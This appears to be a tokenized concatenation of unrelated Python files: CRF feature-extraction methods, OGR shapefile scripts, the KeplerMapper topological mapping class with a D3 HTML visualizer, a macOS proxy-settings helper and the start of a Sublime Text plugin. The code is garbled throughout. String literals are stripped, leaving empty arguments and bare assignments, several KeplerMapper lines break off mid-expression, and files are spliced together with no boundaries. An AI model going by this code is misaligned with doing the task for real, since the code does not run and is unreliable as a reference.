features = self . add_final_features ( sequence , sequence . y [ - 1 ] , features ) \n 
final_features . append ( features ) \n 
\n 
return initial_features , transition_features , final_features , emission_features \n 
\n 
\n 
#f(t,y_t,X) \n 
# Add the word identity and if position is \n 
# the first also adds the tag position \n 
~~ def get_emission_features ( self , sequence , pos , y ) : \n 
~~~ all_feat = [ ] \n 
x = sequence . x [ pos ] \n 
if ( x not in self . node_feature_cache ) : \n 
~~~ self . node_feature_cache [ x ] = { } \n 
~~ if ( y not in self . node_feature_cache [ x ] ) : \n 
~~~ node_idx = [ ] \n 
node_idx = self . add_emission_features ( sequence , pos , y , node_idx ) \n 
self . node_feature_cache [ x ] [ y ] = node_idx \n 
~~ idx = self . node_feature_cache [ x ] [ y ] \n 
all_feat = idx [ : ] \n 
return all_feat \n 
\n 
\n 
\n 
#f(t,y_t,y_(t-1),X) \n 
##Speed up of code \n 
~~ def get_transition_features ( self , sequence , pos , y , y_prev ) : \n 
~~~ assert ( pos >= 0 and pos < len ( sequence . x ) ) , pdb . set_trace ( ) \n 
\n 
if ( y not in self . edge_feature_cache ) : \n 
~~~ self . edge_feature_cache [ y ] = { } \n 
~~ if ( y_prev not in self . edge_feature_cache [ y ] ) : \n 
~~~ edge_idx = [ ] \n 
edge_idx = self . add_transition_features ( sequence , pos , y , y_prev , edge_idx ) \n 
self . edge_feature_cache [ y ] [ y_prev ] = edge_idx \n 
~~ return self . edge_feature_cache [ y ] [ y_prev ] \n 
\n 
\n 
~~ def get_initial_features ( self , sequence , y ) : \n 
~~~ if ( y not in self . initial_state_feature_cache ) : \n 
~~~ edge_idx = [ ] \n 
edge_idx = self . add_initial_features ( sequence , y , edge_idx ) \n 
self . initial_state_feature_cache [ y ] = edge_idx \n 
~~ return self . initial_state_feature_cache [ y ] \n 
\n 
\n 
~~ def get_final_features ( self , sequence , y_prev ) : \n 
~~~ if ( y_prev not in self . final_state_feature_cache ) : \n 
~~~ edge_idx = [ ] \n 
edge_idx = self . add_final_features ( sequence , y_prev , edge_idx ) \n 
self . final_state_feature_cache [ y_prev ] = edge_idx \n 
~~ return self . final_state_feature_cache [ y_prev ] \n 
\n 
~~ def add_initial_features ( self , sequence , y , features ) : \n 
# Get label name from ID. \n 
~~~ y_name = self . dataset . y_dict . get_label_name ( y ) \n 
# Generate feature name. \n 
feat_name = "init_tag:%s" % ( y_name ) \n 
# Get feature ID from name. \n 
feat_id = self . add_feature ( feat_name ) \n 
# Append feature. \n 
if ( feat_id != - 1 ) : \n 
~~~ features . append ( feat_id ) \n 
~~ return features \n 
\n 
~~ def add_final_features ( self , sequence , y_prev , features ) : \n 
# Get label name from ID. \n 
~~~ y_name = self . dataset . y_dict . get_label_name ( y_prev ) \n 
# Generate feature name. \n 
feat_name = "final_prev_tag:%s" % ( y_name ) \n 
# Get feature ID from name. \n 
feat_id = self . add_feature ( feat_name ) \n 
# Append feature. \n 
if ( feat_id != - 1 ) : \n 
~~~ features . append ( feat_id ) \n 
~~ return features \n 
\n 
~~ def add_emission_features ( self , sequence , pos , y , features ) : \n 
~~~ \n 
x = sequence . x [ pos ] \n 
# Get tag name from ID. \n 
y_name = self . dataset . y_dict . get_label_name ( y ) \n 
# Get word name from ID. \n 
x_name = self . dataset . x_dict . get_label_name ( x ) \n 
# Generate feature name. \n 
feat_name = "id:%s::%s" % ( x_name , y_name ) \n 
# Get feature ID from name. \n 
feat_id = self . add_feature ( feat_name ) \n 
# Append feature. \n 
if feat_id != - 1 : \n 
~~~ features . append ( feat_id ) \n 
~~ return features \n 
\n 
~~ def add_transition_features ( self , sequence , pos , y , y_prev , features ) : \n 
~~~ """ Adds a feature to the edge feature list.\n        Creates a unique id if its the first time the feature is visited\n        or returns the existing id otherwise\n        """ \n 
assert pos < len ( sequence . x ) - 1 , pdb . set_trace ( ) \n 
\n 
# Get label name from ID. \n 
y_name = self . dataset . y_dict . get_label_name ( y ) \n 
# Get previous label name from ID. \n 
y_prev_name = self . dataset . y_dict . get_label_name ( y_prev ) \n 
# Generate feature name. \n 
feat_name = "prev_tag:%s::%s" % ( y_prev_name , y_name ) \n 
# Get feature ID from name. \n 
feat_id = self . add_feature ( feat_name ) \n 
# Append feature. \n 
if ( feat_id != - 1 ) : \n 
~~~ features . append ( feat_id ) \n 
~~ return features \n 
\n 
~~ def add_feature ( self , feat_name ) : \n 
~~~ """\n        Builds a dictionary of feature name to feature id\n        If we are at test time and we don\'t have the feature\n        we return -1.\n        """ \n 
# Check if feature exists and if so, return the feature ID.  \n 
if ( feat_name in self . feature_dict ) : \n 
~~~ return self . feature_dict [ feat_name ] \n 
\n 
# dictionary and return the feature ID. Otherwise return -1. \n 
~~ if not self . add_features : \n 
~~~ return - 1 \n 
~~ return self . feature_dict . add ( feat_name ) \n 
#!/usr/bin/env python \n 
\n 
~~ ~~ \n 
import os \n 
\n 
try : \n 
~~~ import ogr \n 
~~ except ImportError : \n 
~~~ from osgeo import ogr \n 
\n 
#an example of shapefile data \n 
~~ line_shp_file = "../static_files/shapefile/rivers_lake_centerlines/ne_50m_rivers_lake_centerlines.shp" \n 
#open line shapefile \n 
line_datasource = ogr . Open ( line_shp_file ) \n 
\n 
#set driver to shapefile to be able to create point shapefile file \n 
driver = ogr . GetDriverByName ( ) \n 
\n 
#output point shapefile file name \n 
point_shp_file = \n 
\n 
#output point shapefile file layer name \n 
layer_name = \n 
\n 
#create shapefile data_source(file) \n 
if os . path . exists ( point_shp_file ) : \n 
~~~ driver . DeleteDataSource ( point_shp_file ) \n 
~~ point_datasource = driver . CreateDataSource ( point_shp_file ) \n 
\n 
#get number of layers of line shapefile \n 
layer_count = line_datasource . GetLayerCount ( ) \n 
for each_layer in range ( layer_count ) : \n 
#get one line shapefile \n 
~~~ layer = line_datasource . GetLayerByIndex ( each_layer ) \n 
\n 
#get line shapefile spatial reference \n 
srs = layer . GetSpatialRef ( ) \n 
\n 
#create point shapefile layer with same spatial reference as line shapefile \n 
point_shp_layer = point_datasource . CreateLayer ( layer_name , srs , ogr . wkbPoint ) \n 
\n 
#get number of features of line shapefile \n 
feature_count = layer . GetFeatureCount ( ) \n 
for each_feature in range ( feature_count ) : \n 
#get each line feature \n 
~~~ line_feature = layer . GetFeature ( each_feature ) \n 
#get line feature geometry \n 
feature_geom = line_feature . GetGeometryRef ( ) \n 
if feature_geom . GetGeometryName ( ) != : \n 
#get points data from each line feature \n 
~~~ points = feature_geom . GetPoints ( ) \n 
for point in points : \n 
#make point geometry \n 
~~~ point_geom = ogr . Geometry ( ogr . wkbPoint ) \n 
#add point to point geometry \n 
point_geom . AddPoint ( point [ 0 ] , point [ 1 ] ) \n 
#define point feature \n 
point_feature = ogr . Feature ( point_shp_layer . GetLayerDefn ( ) ) \n 
#add point to point feature \n 
point_feature . SetGeometry ( point_geom ) \n 
#add point feature to poitn layer \n 
point_shp_layer . CreateFeature ( point_feature ) \n 
#!/usr/bin/env python \n 
\n 
~~ ~~ ~~ ~~ \n 
\n 
try : \n 
~~~ import ogr \n 
~~ except ImportError : \n 
~~~ from osgeo import ogr \n 
\n 
~~ latitudes = [ 50 , 51 , 52 , 53 , 54 ] \n 
longitudes = [ 100 , 110 , 120 , 130 , 140 ] \n 
#to make 2D point \n 
elevation = 0 \n 
\n 
#define multi-points geometry \n 
points = ogr . Geometry ( ogr . wkbMultiPoint ) \n 
\n 
#make first point \n 
#define first point geometry \n 
point_1 = ogr . Geometry ( ogr . wkbPoint ) \n 
#add point into first point geometry \n 
point_1 . AddPoint ( longitudes [ 0 ] , latitudes [ 0 ] , elevation ) \n 
#add first point geometry into multi-point geometry \n 
points . AddGeometry ( point_1 ) \n 
\n 
#make second point \n 
#define second point geometry \n 
point_2 = ogr . Geometry ( ogr . wkbPoint ) \n 
#add point into second point geometry \n 
point_2 . AddPoint ( longitudes [ 1 ] , latitudes [ 1 ] , elevation ) \n 
#add second point geometry into multi-point geometry \n 
points . AddGeometry ( point_2 ) \n 
\n 
#make third point \n 
#define third point geometry \n 
point_3 = ogr . Geometry ( ogr . wkbPoint ) \n 
#add point into thirs point geometry \n 
point_3 . AddPoint ( longitudes [ 2 ] , latitudes [ 2 ] , elevation ) \n 
#add third point geometry into multi-point geometry \n 
points . AddGeometry ( point_3 ) \n 
\n 
#make fourth point \n 
#define fourth point geometry \n 
point_4 = ogr . Geometry ( ogr . wkbPoint ) \n 
#add point into fourth point geometry \n 
point_4 . AddPoint ( longitudes [ 3 ] , latitudes [ 3 ] , elevation ) \n 
#add fourth point geometry into multi-point geometry \n 
points . AddGeometry ( point_4 ) \n 
\n 
#make fifth point \n 
#define fifth point geometry \n 
point_5 = ogr . Geometry ( ogr . wkbPoint ) \n 
#add point into fifth point geometry \n 
point_5 . AddPoint ( longitudes [ 4 ] , latitudes [ 4 ] , elevation ) \n 
#add fifth point geometry into multi-point geometry \n 
points . AddGeometry ( point_5 ) \n 
\n 
#convert multi-point geometry into WKT format \n 
points . ExportToWkt ( ) \n 
print points \n 
from __future__ import division \n 
import numpy as np \n 
from collections import defaultdict \n 
import json \n 
import itertools \n 
from sklearn import cluster , preprocessing , manifold \n 
from datetime import datetime \n 
import sys \n 
\n 
class KeplerMapper ( object ) : \n 
# With this class you can build topological networks from (high-dimensional) data. \n 
# \n 
# 1)   \tFit a projection/lens/function to a dataset and transform it.  \n 
#     \tFor instance "mean_of_row(x) for x in X" \n 
# 2)   \tMap this projection with overlapping intervals/hypercubes.  \n 
#    \t\tCluster the points inside the interval  \n 
#    \t\t(Note: we cluster on the inverse image/original data to lessen projection loss). \n 
#    \t\tIf two clusters/nodes have the same members (due to the overlap), then:  \n 
#    \t\tconnect these with an edge. \n 
# 3)  \tVisualize the network using HTML and D3.js. \n 
#  \n 
# functions \n 
# --------- \n 
# fit_transform:   Create a projection (lens) from a dataset \n 
# map:         \tApply Mapper algorithm on this projection and build a simplicial complex \n 
# visualize:    \tTurns the complex dictionary into a HTML/D3.js visualization \n 
\n 
~~~ def __init__ ( self , verbose = 2 ) : \n 
~~~ self . verbose = verbose \n 
\n 
self . chunk_dist = [ ] \n 
self . overlap_dist = [ ] \n 
self . d = [ ] \n 
self . nr_cubes = 0 \n 
self . overlap_perc = 0 \n 
self . clusterer = False \n 
\n 
~~ def fit_transform ( self , X , projection = "sum" , scaler = preprocessing . MinMaxScaler ( ) ) : \n 
# Creates the projection/lens from X.  \n 
# \n 
# Input:      X. Input features as a numpy array. \n 
# Output:     projected_X. original data transformed to a projection (lens). \n 
#  \n 
# parameters \n 
# ---------- \n 
# projection:   Projection parameter is either a string,  \n 
#               a scikit class with fit_transform, like manifold.TSNE(),  \n 
#               or a list of dimension indices. \n 
# scaler:       if None, do no scaling, else apply scaling to the projection \n 
#               Default: Min-Max scaling \n 
\n 
~~~ self . scaler = scaler \n 
self . projection = str ( projection ) \n 
\n 
# Detect if projection is a class (for scikit-learn) \n 
if str ( type ( projection ) ) [ 1 : 6 ] == "class" : #TODO: de-ugly-fy \n 
~~~ reducer = projection \n 
if self . verbose > 0 : \n 
~~~ try : \n 
~~~ projection . set_params ( ** { "verbose" : self . verbose } ) \n 
~~ except : \n 
~~~ pass \n 
~~ print ( "\\n..Projecting data using: \\n\\t%s\\n" % str ( projection ) ) \n 
~~ X = reducer . fit_transform ( X ) \n 
\n 
# Detect if projection is a string (for standard functions) \n 
~~ if isinstance ( projection , str ) : \n 
~~~ if self . verbose > 0 : \n 
~~~ print ( "\\n..Projecting data using: %s" % ( projection ) ) \n 
# Stats lenses \n 
~~ if projection == "sum" : # sum of row \n 
~~~ X = np . sum ( X , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
~~ if projection == "mean" : # mean of row \n 
~~~ X = np . mean ( X , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
~~ if projection == "median" : # mean of row \n 
~~~ X = np . median ( X , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
~~ if projection == "max" : # max of row \n 
~~~ X = np . max ( X , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
~~ if projection == "min" : # min of row \n 
~~~ X = np . min ( X , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
~~ if projection == "std" : # std of row \n 
~~~ X = np . std ( X , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
\n 
~~ if projection == "dist_mean" : # Distance of x to mean of X \n 
~~~ X_mean = np . mean ( X , axis = 0 ) \n 
X = np . sum ( np . sqrt ( ( X - X_mean ) ** 2 ) , axis = 1 ) . reshape ( ( X . shape [ 0 ] , 1 ) ) \n 
\n 
# Detect if projection is a list (with dimension indices) \n 
~~ ~~ if isinstance ( projection , list ) : \n 
~~~ if self . verbose > 0 : \n 
~~~ print ( "\\n..Projecting data using: %s" % ( str ( projection ) ) ) \n 
~~ X = X [ : , np . array ( projection ) ] \n 
\n 
# Scaling \n 
~~ if scaler is not None : \n 
~~~ if self . verbose > 0 : \n 
~~~ print ( "\\n..Scaling with: %s\\n" % str ( scaler ) ) \n 
~~ X = scaler . fit_transform ( X ) \n 
\n 
~~ return X \n 
\n 
~~ def map ( self , projected_X , inverse_X = None , clusterer = cluster . DBSCAN ( eps = 0.5 , min_samples = 3 ) , nr_cubes # This maps the data to a simplicial complex. Returns a dictionary with nodes and links. \n 
#  \n 
# Input:    projected_X. A Numpy array with the projection/lens.  \n 
# Output:    complex. A dictionary with "nodes", "links" and "meta information" \n 
# \n 
# parameters \n 
# ---------- \n 
# projected_X  \tprojected_X. A Numpy array with the projection/lens. Required. \n 
# inverse_X    \tNumpy array or None. If None then the projection itself is used for clustering. \n 
# clusterer    \tScikit-learn API compatible clustering algorithm. Default: DBSCAN \n 
# nr_cubes    \tInt. The number of intervals/hypercubes to create. \n 
# overlap_perc  Float. The percentage of overlap "between" the intervals/hypercubes. \n 
\n 
~~~ start = datetime . now ( ) \n 
\n 
# Helper function \n 
def cube_coordinates_all ( nr_cubes , nr_dimensions ) : \n 
# Helper function to get origin coordinates for our intervals/hypercubes \n 
# Useful for looping no matter the number of cubes or dimensions \n 
# Example:   \tif there are 4 cubes per dimension and 3 dimensions  \n 
#       \t\treturn the bottom left (origin) coordinates of 64 hypercubes,  \n 
#       \t\tas a sorted list of Numpy arrays \n 
# TODO: elegance-ify... \n 
~~~ l = [ ] \n 
for x in range ( nr_cubes ) : \n 
~~~ l += [ x ] * nr_dimensions \n 
~~ return [ np . array ( list ( f ) ) for f in sorted ( set ( itertools . permutations ( l , nr_dimensions ) ) ) ] \n 
\n 
~~ nodes = defaultdict ( list ) \n 
links = defaultdict ( list ) \n 
complex = { } \n 
self . nr_cubes = nr_cubes \n 
self . clusterer = clusterer \n 
self . overlap_perc = overlap_perc \n 
\n 
if self . verbose > 0 : \n 
~~~ print ( "Mapping on data shaped %s using dimensions\\n" % ( str ( projected_X . shape ) ) ) \n 
\n 
# If inverse image is not provided, we use the projection as the inverse image (suffer projection loss) ~~ if inverse_X is None : \n 
~~~ inverse_X = projected_X \n 
\n 
\n 
~~ self . chunk_dist = ( np . max ( projected_X , axis = 0 ) - np . min ( projected_X , axis = 0 ) ) / nr_cubes \n 
\n 
# We calculate the overlapping windows distance  \n 
self . overlap_dist = self . overlap_perc * self . chunk_dist \n 
\n 
# We find our starting point \n 
self . d = np . min ( projected_X , axis = 0 ) \n 
\n 
# Use a dimension index array on the projected X \n 
# (For now this uses the entire dimensionality, but we keep for experimentation) \n 
di = np . array ( [ x for x in range ( projected_X . shape [ 1 ] ) ] ) \n 
\n 
\n 
ids = np . array ( [ x for x in range ( projected_X . shape [ 0 ] ) ] ) \n 
projected_X = np . c_ [ ids , projected_X ] \n 
inverse_X = np . c_ [ ids , inverse_X ] \n 
\n 
# Subdivide the projected data X in intervals/hypercubes with overlap \n 
if self . verbose > 0 : \n 
~~~ total_cubes = len ( cube_coordinates_all ( nr_cubes , projected_X . shape [ 1 ] ) ) \n 
print ( "Creating %s hypercubes." % total_cubes ) \n 
\n 
~~ for i , coor in enumerate ( cube_coordinates_all ( nr_cubes , di . shape [ 0 ] ) ) : \n 
# Slice the hypercube \n 
~~~ hypercube = projected_X [ np . invert ( np . any ( ( projected_X [ : , di + 1 ] >= self . d [ di ] + ( coor * self . chunk_dist ( projected_X [ : , di + 1 ] < self . d [ di ] + ( coor * self . chunk_dist [ di ] ) + self . chunk_dist [ di ] + self \n 
if self . verbose > 1 : \n 
~~~ print ( "There are %s points in cube_%s / %s with starting range %s" % \n 
( hypercube . shape [ 0 ] , i , total_cubes , self . d [ di ] + ( coor * self . chunk_dist [ di ] ) ) ) \n 
\n 
# If at least one sample inside the hypercube \n 
~~ if hypercube . shape [ 0 ] > 0 : \n 
# Cluster the data point(s) in the cube, skipping the id-column \n 
# Note that we apply clustering on the inverse image (original data samples) that fall inside the cube. ~~~ inverse_x = inverse_X [ [ int ( nn ) for nn in hypercube [ : , 0 ] ] ] \n 
\n 
clusterer . fit ( inverse_x [ : , 1 : ] ) \n 
\n 
if self . verbose > 1 : \n 
~~~ print ( "Found %s clusters in cube_%s\\n" % ( np . unique ( clusterer . labels_ [ clusterer . labels_ > - 1 \n 
#Now for every (sample id in cube, predicted cluster label) \n 
~~ for a in np . c_ [ hypercube [ : , 0 ] , clusterer . labels_ ] : \n 
~~~ if a [ 1 ] != - 1 : #if not predicted as noise \n 
~~~ cluster_id = str ( coor [ 0 ] ) + "_" + str ( i ) + "_" + str ( a [ 1 ] ) + "_" + str ( coor ) + "_" + str ( self . d [ di ] + ( coor nodes [ cluster_id ] . append ( int ( a [ 0 ] ) ) \n 
~~ ~~ ~~ else : \n 
~~~ if self . verbose > 1 : \n 
~~~ print ( "Cube_%s is empty.\\n" % ( i ) ) \n 
\n 
# Create links when clusters from different hypercubes have members with the same sample id. \n 
~~ ~~ ~~ candidates = itertools . combinations ( nodes . keys ( ) , 2 ) \n 
for candidate in candidates : \n 
# if there are non-unique members in the union \n 
~~~ if len ( nodes [ candidate [ 0 ] ] + nodes [ candidate [ 1 ] ] ) != len ( set ( nodes [ candidate [ 0 ] ] + nodes [ candidate ~~~ links [ candidate [ 0 ] ] . append ( candidate [ 1 ] ) \n 
\n 
# Reporting \n 
~~ ~~ if self . verbose > 0 : \n 
~~~ nr_links = 0 \n 
for k in links : \n 
~~~ nr_links += len ( links [ k ] ) \n 
~~ print ( "\\ncreated %s edges and %s nodes in %s." % ( nr_links , len ( nodes ) , str ( datetime . now ( ) - start ) ) \n 
~~ complex [ "nodes" ] = nodes \n 
complex [ "links" ] = links \n 
complex [ "meta" ] = self . projection \n 
\n 
return complex \n 
\n 
~~ def visualize ( self , complex , color_function = "" , path_html = "mapper_visualization_output.html" , title graph_link_distance = 30 , graph_gravity = 0.1 , graph_charge = - 120 , custom_tooltips = None , width_html height_html = 0 , show_tooltips = True , show_title = True , show_meta = True ) : \n 
\n 
# \n 
# Input:      complex. Dictionary (output from calling .map()) \n 
\n 
#  \n 
# parameters \n 
# ---------- \n 
# color_function    \tstring. Not fully implemented. Default: "" (distance to origin) \n 
# path_html        \t\tfile path as string. Where to save the HTML page. \n 
# title          \t\tstring. HTML page document title and first heading. \n 
# graph_link_distance  \tint. Edge length. \n 
# graph_gravity     \tfloat. "Gravity" to center of layout. \n 
# graph_charge      \tint. charge between nodes. \n 
# custom_tooltips   \tNone or Numpy Array. You could use "y"-label array for this. \n 
# width_html        \tint. Width of canvas. Default: 0 (full width) \n 
# height_html       \tint. Height of canvas. Default: 0 (full height) \n 
# show_tooltips     \tbool. default:True \n 
# show_title      \t\tbool. default:True \n 
# show_meta        \t\tbool. default:True \n 
\n 
# Format JSON for D3 graph \n 
~~~ json_s = { } \n 
json_s [ "nodes" ] = [ ] \n 
json_s [ "links" ] = [ ] \n 
k2e = { } \n 
\n 
for e , k in enumerate ( complex [ "nodes" ] ) : \n 
# Tooltip and node color formatting, TODO: de-mess-ify \n 
~~~ if custom_tooltips is not None : \n 
~~~ tooltip_s = "<h2>Cluster %s</h2>" % k + " " . join ( [ str ( f ) for f in custom_tooltips [ complex [ "nodes" if color_function == "average_signal_cluster" : \n 
~~~ tooltip_i = int ( ( ( sum ( [ f for f in custom_tooltips [ complex [ "nodes" ] [ k ] ] ] ) / len ( custom_tooltips json_s [ "nodes" ] . append ( { "name" : str ( k ) , "tooltip" : tooltip_s , "group" : 2 * int ( np . log ( len ( ~~ else : \n 
~~~ json_s [ "nodes" ] . append ( { "name" : str ( k ) , "tooltip" : tooltip_s , "group" : 2 * int ( np . log ( len ( ~~ ~~ else : \n 
~~~ tooltip_s = "<h2>Cluster %s</h2>Contains %s members." % ( k , len ( complex [ "nodes" ] [ k ] ) ) \n 
json_s [ "nodes" ] . append ( { "name" : str ( k ) , "tooltip" : tooltip_s , "group" : 2 * int ( np . log ( len ( complex ~~ k2e [ k ] = e \n 
~~ for k in complex [ "links" ] : \n 
~~~ for link in complex [ "links" ] [ k ] : \n 
~~~ json_s [ "links" ] . append ( { "source" : k2e [ k ] , "target" : k2e [ link ] , "value" : 1 } ) \n 
\n 
# Width and height of graph in HTML output \n 
~~ ~~ if width_html == 0 : \n 
~~~ width_css = "100%" \n 
width_js = \'document.getElementById("holder").offsetWidth-20\' \n 
~~ else : \n 
~~~ width_css = "%spx" % width_html \n 
width_js = "%s" % width_html \n 
~~ if height_html == 0 : \n 
~~~ height_css = "100%" \n 
height_js = \'document.getElementById("holder").offsetHeight-20\' \n 
~~ else : \n 
~~~ height_css = "%spx" % height_html \n 
height_js = "%s" % height_html \n 
\n 
# Whether to show certain UI elements or not \n 
~~ if show_tooltips == False : \n 
~~~ tooltips_display = "display: none;" \n 
~~ else : \n 
~~~ tooltips_display = "" \n 
\n 
~~ if show_meta == False : \n 
~~~ meta_display = "display: none;" \n 
~~ else : \n 
~~~ meta_display = "" \n 
\n 
~~ if show_title == False : \n 
~~~ title_display = "display: none;" \n 
~~ else : \n 
~~~ title_display = "" \n 
\n 
~~ with open ( path_html , "wb" ) as outfile : \n 
~~~ html = """<!DOCTYPE html>\n    <meta charset="utf-8">\n    <meta name="generator" content="KeplerMapper">\n    <title>%s | KeplerMapper</title>\n    <link href=\'https://fonts.googleapis.com/css?family=Roboto:700,300\' rel=\'stylesheet\' type=\'text/css\'>\n    <style>\n    * {margin: 0; padding: 0;}\n    html { height: 100%%;}\n    body {background: #111; height: 100%%; font: 100 16px Roboto, Sans-serif;}\n    .link { stroke: #999; stroke-opacity: .333;  }\n    .divs div { border-radius: 50%%; background: red; position: absolute; }\n    .divs { position: absolute; top: 0; left: 0; }\n    #holder { position: relative; width: %s; height: %s; background: #111; display: block;}\n    h1 { %s padding: 20px; color: #fafafa; text-shadow: 0px 1px #000,0px -1px #000; position: absolute; font: 300 30px Roboto, Sans-serif;}\n    h2 { text-shadow: 0px 1px #000,0px -1px #000; font: 700 16px Roboto, Sans-serif;}\n    .meta {  position: absolute; opacity: 0.9; width: 220px; top: 80px; left: 20px; display: block; %s background: #000; line-height: 25px; color: #fafafa; border: 20px solid #000; font: 100 16px Roboto, Sans-serif;}\n    div.tooltip { position: absolute; width: 380px; display: block; %s padding: 20px; background: #000; border: 0px; border-radius: 3px; pointer-events: none; z-index: 999; color: #FAFAFA;}\n    }\n    </style>\n    <body>\n    <div id="holder">\n      <h1>%s</h1>\n      <p class="meta">\n      <b>Lens</b><br>%s<br><br>\n      <b>Cubes per dimension</b><br>%s<br><br>\n      <b>Overlap percentage</b><br>%s%%<br><br>\n      <b>Color Function</b><br>%s( %s )<br><br>\n      <b>Clusterer</b><br>%s<br><br>\n      <b>Scaler</b><br>%s\n      </p>\n    </div>\n    <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>\n    <script>\n    var width = %s,\n      height = %s;\n    var color = d3.scale.ordinal()\n      .domain(["0","1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30"])\n      .range(["#FF0000","#FF1400","#FF2800","#FF3c00","#FF5000","#FF6400","#FF7800","#FF8c00","#FFa000","#FFb400","#FFc800","#FFdc00","#FFf000","#fdff00","#b0ff00","#65ff00","#17ff00","#00ff36","#00ff83","#00ffd0","#00e4ff","#00c4ff","#00a4ff","#00a4ff","#0084ff","#0064ff","#0044ff","#0022ff","#0002ff","#0100ff","#0300ff","#0500ff"]);\n    var force = d3.layout.force()\n      .charge(%s)\n      .linkDistance(%s)\n      .gravity(%s)\n      .size([width, height]);\n    var svg = d3.select("#holder").append("svg")\n      .attr("width", width)\n      .attr("height", height);\n    \n    var div = d3.select("#holder").append("div")   \n      .attr("class", "tooltip")               \n      .style("opacity", 0.0);\n    \n    var divs = d3.select(\'#holder\').append(\'div\')\n      .attr(\'class\', \'divs\')\n      .attr(\'style\', function(d) { return \'overflow: hidden; width: \' + width + \'px; height: \' + height + \'px;\'; });  \n    \n      graph = %s;\n      force\n        .nodes(graph.nodes)\n        .links(graph.links)\n        .start();\n      var link = svg.selectAll(".link")\n        .data(graph.links)\n        .enter().append("line")\n        .attr("class", "link")\n        .style("stroke-width", function(d) { return Math.sqrt(d.value); });\n      var node = divs.selectAll(\'div\')\n      .data(graph.nodes)\n        .enter().append(\'div\')\n        .on("mouseover", function(d) {      \n          div.transition()        \n            .duration(200)      \n            .style("opacity", .9);\n          div .html(d.tooltip + "<br/>")  \n            .style("left", (d3.event.pageX + 100) + "px")     \n            .style("top", (d3.event.pageY - 28) + "px");    \n          })                  \n        .on("mouseout", function(d) {       \n          div.transition()        \n            .duration(500)      \n            .style("opacity", 0);   \n        })\n        .call(force.drag);\n      \n      node.append("title")\n        .text(function(d) { return d.name; });\n      force.on("tick", function() {\n      link.attr("x1", function(d) { return d.source.x; })\n        .attr("y1", function(d) { return d.source.y; })\n        .attr("x2", function(d) { return d.target.x; })\n        .attr("y2", function(d) { return d.target.y; });\n      node.attr("cx", function(d) { return d.x; })\n        .attr("cy", function(d) { return d.y; })\n        .attr(\'style\', function(d) { return \'width: \' + (d.group * 2) + \'px; height: \' + (d.group * 2) + \'px; \' + \'left: \'+(d.x-(d.group))+\'px; \' + \'top: \'+(d.y-(d.group))+\'px; background: \'+color(d.color)+\'; box-shadow: 0px 0px 3px #111; box-shadow: 0px 0px 33px \'+color(d.color)+\', inset 0px 0px 5px rgba(0, 0, 0, 0.2);\'})\n        ;\n      });\n    </script>""" % ( title , width_css , height_css , title_display , meta_display , tooltips_display , title , outfile . write ( html . encode ( "utf-8" ) ) \n 
~~ if self . verbose > 0 : \n 
~~~ print ( "\\nWrote d3.js graph to \'%s\'" % path_html ) #!/usr/bin/env python \n 
# encoding: utf-8 \n 
~~ ~~ ~~ """\nSCPreferences.py: Simplified interaction with SystemConfiguration preferences\n\nTODO:\n* Refactor getvalue/setvalue code into generic functions for dealing with things other than proxies\n* Add get_proxy() to parallel set_proxy()\n""" \n 
\n 
import sys \n 
import os \n 
import unittest \n 
\n 
from SystemConfiguration import * \n 
\n 
class SCPreferences ( object ) : \n 
~~~ """Utility class for working with the SystemConfiguration framework""" \n 
proxy_protocols = ( , , ) # List of the supported protocols \n 
session = None \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( SCPreferences , self ) . __init__ ( ) \n 
self . session = SCPreferencesCreate ( None , "set-proxy" , None ) \n 
\n 
~~ def save ( self ) : \n 
~~~ if not self . session : \n 
~~~ return \n 
~~ if not SCPreferencesCommitChanges ( self . session ) : \n 
~~~ raise RuntimeError ( "Unable to save SystemConfiguration changes" ) \n 
~~ if not SCPreferencesApplyChanges ( self . session ) : \n 
~~~ raise RuntimeError ( "Unable to apply SystemConfiguration changes" ) \n 
\n 
~~ ~~ def set_proxy ( self , enable = True , protocol = "HTTP" , server = "localhost" , port = 3128 ) : \n 
~~~ new_settings = SCPreferencesPathGetValue ( self . session , ) \n 
\n 
for interface in new_settings : \n 
~~~ new_settings [ interface ] [ ] [ "%sEnable" % protocol ] = 1 if enable else 0 \n 
if enable : \n 
~~~ new_settings [ interface ] [ ] [ % protocol ] = int ( port ) \n 
new_settings [ interface ] [ ] [ % protocol ] = server \n 
\n 
~~ ~~ SCPreferencesPathSetValue ( self . session , , new_settings ) \n 
\n 
~~ ~~ class SCPreferencesTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ raise RuntimeError ( "Thwack Chris about not writing these yet" ) \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ import sublime , sublime_plugin , os , re \n 
\n 
class StyleSheetSetup : \n 
~~~ def __init__ ( self , extensions , regex , partials = None , index = None ) : \n 
~~~ if partials is None : \n 
~~~ self . partials = False \n 
~~ else : \n 
~~~ self . partials = partials \n 
\n 
~~ if index is None : \n 
~~~ self . index = False \n 
~~ else : \n 
~~~ self . index = index \n 
\n 
~~ self . extensions = extensions \n 
self . regex = regex \n 
\n 
~~ ~~ class ListStylesheetVariables ( sublime_plugin . TextCommand ) : \n 
~~~ def run ( self , edit ) : \n 
~~~ settings = sublime . load_settings ( ) \n 
\n 
handle_imports = settings . get ( "readImported" ) \n 
read_all_views = settings . get ( "readAllViews" ) \n 
\n 
# Define setups \n 
less_setup = StyleSheetSetup ( ( , ) , "(@[^\\s\\\\]]*)\\s*: *(.*);" ) \n 
sass_setup = StyleSheetSetup ( ( , ) , "^\\s*(\\$[^\\s\\\\]{}]*)\\s*: *([^;\\n]*);?" , True stylus_setup = StyleSheetSetup ( ( , ) , "^\\s*([^\\s\\\\]\\[]*) *= *([^;\\n]*)" , False , True ) \n 
sass_erb_setup = StyleSheetSetup ( ( , ) , "^\\s*(\\$[^\\s\\\\]{}]*)\\s*: <?%?=? *([^;\\n]*);? [\\%>]?" \n 
